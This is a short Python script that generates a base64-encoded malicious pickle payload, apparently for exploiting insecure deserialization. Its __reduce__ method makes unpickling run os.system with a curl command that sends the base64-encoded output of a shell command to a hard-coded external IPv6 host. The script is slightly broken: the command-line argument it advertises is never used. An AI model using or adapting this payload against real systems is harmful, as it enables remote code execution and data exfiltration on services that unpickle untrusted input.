#!/bin/python3
import base64
import os
import pickle
import sys

from requests import Session, exceptions

try:
    if sys.argv[1] == "--help" or sys.argv[1] == "-h":
        print("""\nUSAGE\n=====\n./pickle-payload-gen.py <payload>\n""")
        sys.exit()

except IndexError:
    print("\n[-] No payload specified sticking with default payload => id\n")
    command = "id"


class PAYLOAD:
    def __reduce__(self):
        subcmd = "nc -h"
        cmd = (
            f"curl -g -6 http://[9000:6666:6666:6666:216:3eff:feb1:8d80]:80/$({subcmd} | base64 -w0)"
        )
        return (os.system, (cmd,))


b64Encoded = base64.b64encode(pickle.dumps(PAYLOAD(), protocol=0)).decode("utf-8")
print(b64Encoded)